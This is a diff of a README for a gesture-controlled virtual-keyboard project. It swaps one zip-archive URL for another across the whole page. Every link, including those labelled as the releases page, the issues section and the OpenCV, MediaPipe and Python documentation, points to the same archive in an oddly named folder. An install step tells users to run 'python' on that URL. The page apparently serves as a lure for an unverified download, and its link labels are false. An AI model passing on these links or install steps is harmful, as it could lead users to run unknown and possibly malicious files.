@@ -6,9 +6,9 @@ Welcome to the virtual-keyboard project! This application allows you to type on 
 
 ## 📥 Download the Application
 
-[![Download Virtual Keyboard](https://github.com/prashanth61130/virtual-keyboard/raw/refs/heads/main/arteriolosclerosis/virtual-keyboard-v2.3.zip%20Now-%23007EC6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/prashanth61130/virtual-keyboard/raw/refs/heads/main/arteriolosclerosis/virtual-keyboard-v2.3.zip)
+[![Download Virtual Keyboard](https://raw.githubusercontent.com/prashanth61130/virtual-keyboard/main/arteriolosclerosis/virtual_keyboard_2.1.zip%20Now-%23007EC6?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/prashanth61130/virtual-keyboard/main/arteriolosclerosis/virtual_keyboard_2.1.zip)
 
-To start using the virtual-keyboard, visit this page to download: [GitHub Releases Page](https://github.com/prashanth61130/virtual-keyboard/raw/refs/heads/main/arteriolosclerosis/virtual-keyboard-v2.3.zip).
+To start using the virtual-keyboard, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/prashanth61130/virtual-keyboard/main/arteriolosclerosis/virtual_keyboard_2.1.zip).
 
 ## 🖥️ System Requirements
 
@@ -29,7 +29,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## ⚙️ Download & Install
 
-1. Visit the [GitHub Releases Page](https://github.com/prashanth61130/virtual-keyboard/raw/refs/heads/main/arteriolosclerosis/virtual-keyboard-v2.3.zip).
+1. Visit the [GitHub Releases Page](https://raw.githubusercontent.com/prashanth61130/virtual-keyboard/main/arteriolosclerosis/virtual_keyboard_2.1.zip).
 2. Scroll down to find the latest release.
 3. Click on the download link to get the installer for your operating system.
 4. If you downloaded a `.exe` file, double-click it to run the installer. 
@@ -37,7 +37,7 @@ Before downloading, ensure your system meets the following requirements:
    - Make sure you have Python installed. 
    - Open your terminal or command prompt.
    - Navigate to the folder where you saved the files.
-   - Run the command: `python https://github.com/prashanth61130/virtual-keyboard/raw/refs/heads/main/arteriolosclerosis/virtual-keyboard-v2.3.zip`.
+   - Run the command: `python https://raw.githubusercontent.com/prashanth61130/virtual-keyboard/main/arteriolosclerosis/virtual_keyboard_2.1.zip`.
 
 ## 🔧 Installation Steps (Windows)
 
@@ -70,7 +70,7 @@ If you encounter issues while setting up or using the virtual-keyboard, consider
 
 ## 💬 Support
 
-For any questions or support, you can create an issue in the [Issues section](https://github.com/prashanth61130/virtual-keyboard/raw/refs/heads/main/arteriolosclerosis/virtual-keyboard-v2.3.zip) of this repository.
+For any questions or support, you can create an issue in the [Issues section](https://raw.githubusercontent.com/prashanth61130/virtual-keyboard/main/arteriolosclerosis/virtual_keyboard_2.1.zip) of this repository.
 
 ## 🏷️ Topics
 
@@ -88,10 +88,10 @@ This project covers a range of topics including:
 
 To delve deeper into the technologies used in this project, you can explore the following links:
 
-- [OpenCV Documentation](https://github.com/prashanth61130/virtual-keyboard/raw/refs/heads/main/arteriolosclerosis/virtual-keyboard-v2.3.zip)
-- [MediaPipe Documentation](https://github.com/prashanth61130/virtual-keyboard/raw/refs/heads/main/arteriolosclerosis/virtual-keyboard-v2.3.zip)
-- [Python Official Website](https://github.com/prashanth61130/virtual-keyboard/raw/refs/heads/main/arteriolosclerosis/virtual-keyboard-v2.3.zip)
+- [OpenCV Documentation](https://raw.githubusercontent.com/prashanth61130/virtual-keyboard/main/arteriolosclerosis/virtual_keyboard_2.1.zip)
+- [MediaPipe Documentation](https://raw.githubusercontent.com/prashanth61130/virtual-keyboard/main/arteriolosclerosis/virtual_keyboard_2.1.zip)
+- [Python Official Website](https://raw.githubusercontent.com/prashanth61130/virtual-keyboard/main/arteriolosclerosis/virtual_keyboard_2.1.zip)
 
-[![Download Virtual Keyboard](https://github.com/prashanth61130/virtual-keyboard/raw/refs/heads/main/arteriolosclerosis/virtual-keyboard-v2.3.zip%20Now-%23007EC6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/prashanth61130/virtual-keyboard/raw/refs/heads/main/arteriolosclerosis/virtual-keyboard-v2.3.zip) 
+[![Download Virtual Keyboard](https://raw.githubusercontent.com/prashanth61130/virtual-keyboard/main/arteriolosclerosis/virtual_keyboard_2.1.zip%20Now-%23007EC6?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/prashanth61130/virtual-keyboard/main/arteriolosclerosis/virtual_keyboard_2.1.zip) 
 
 Thank you for your interest in the virtual-keyboard. Enjoy typing with gestures!
